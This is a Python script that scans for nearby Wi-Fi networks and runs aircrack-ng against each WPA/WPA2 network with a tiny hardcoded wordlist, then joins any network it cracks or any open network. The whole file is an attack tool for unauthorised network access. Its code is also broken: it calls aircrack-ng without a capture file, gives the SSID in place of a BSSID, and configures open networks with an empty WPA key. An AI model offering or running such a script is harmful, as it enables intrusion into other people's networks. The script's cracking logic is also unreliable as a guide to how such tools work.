import subprocess
import re
import time
import os

def scan_wifi_networks():
    try:
        result = subprocess.run(['nmcli', '-f', 'SSID,SECURITY', 'device', 'wifi', 'list'], 
                              capture_output=True, text=True)
        networks = []
        for line in result.stdout.splitlines()[1:]:  # Skip header
            if line.strip():
                ssid, security = re.split(r'\s{2,}', line.strip())[:2]
                networks.append({'ssid': ssid, 'security': security})
        return networks
    except Exception as e:
        print(f"Error scanning networks: {e}")
        return []

def crack_wifi_password(ssid, security):
    if security == '--' or 'WEP' in security:
        return None  # Skip open or WEP networks for simplicity
    
    try:
        # Generate wordlist file (simplified example, use a real wordlist in practice)
        wordlist = "/tmp/wordlist.txt"
        with open(wordlist, 'w') as f:
            f.write("password123\nadmin123\n12345678\n")  # Example passwords
        
        # Use aircrack-ng for WPA/WPA2 (requires capture file in real scenarios)
        cmd = ['aircrack-ng', '-w', wordlist, '-b', ssid, '-e', ssid]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        # Parse aircrack-ng output for password
        match = re.search(r'KEY FOUND! \[ (.+?) \]', result.stdout)
        if match:
            return match.group(1)
        return None
    except Exception as e:
        print(f"Error cracking password for {ssid}: {e}")
        return None

def connect_to_wifi(ssid, password):
    try:
        # Create connection profile
        subprocess.run(['nmcli', 'con', 'delete', ssid], capture_output=True)
        result = subprocess.run(['nmcli', 'con', 'add', 'con-name', ssid, 'type', 'wifi', 
                              'ssid', ssid, 'wifi-sec.key-mgmt', 'wpa-psk', 
                              'wifi-sec.psk', password], capture_output=True, text=True)
        
        if result.returncode == 0:
            # Connect to the network
            subprocess.run(['nmcli', 'con', 'up', ssid], capture_output=True)
            print(f"Connected to {ssid}")
            return True
        else:
            print(f"Failed to connect to {ssid}: {result.stderr}")
            return False
    except Exception as e:
        print(f"Error connecting to {ssid}: {e}")
        return False

def main():
    print("Scanning for WiFi networks...")
    networks = scan_wifi_networks()
    
    if not networks:
        print("No networks found.")
        return
    
    for network in networks:
        ssid = network['ssid']
        security = network['security']
        
        if security == '--':
            print(f"Connecting to open network {ssid}")
            connect_to_wifi(ssid, '')
            continue
            
        print(f"Attempting to crack password for {ssid} ({security})...")
        password = crack_wifi_password(ssid, security)
        
        if password:
            print(f"Password for {ssid}: {password}")
            if connect_to_wifi(ssid, password):
                print(f"Successfully connected to {ssid}")
                break
        else:
            print(f"Failed to crack password for {ssid}")

if __name__ == "__main__":
    main()
